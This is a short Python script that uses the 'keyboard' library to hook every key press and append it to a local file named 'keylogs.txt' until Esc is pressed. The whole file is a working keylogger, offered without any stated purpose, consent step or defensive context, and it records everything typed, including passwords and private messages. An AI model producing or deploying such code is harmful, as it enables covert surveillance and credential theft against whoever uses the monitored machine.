import keyboard

def on_press(event):
    try:
        with open('keylogs.txt', 'a') as f:
            if event.name in ['space', 'enter']:
                f.write(f'[{event.name.upper()}]')
            elif event.name == 'esc':
                return False
            else:
                f.write(event.name)
    except Exception as e:
        print(f'Error: {e}')

keyboard.on_press(on_press)
keyboard.wait('esc')
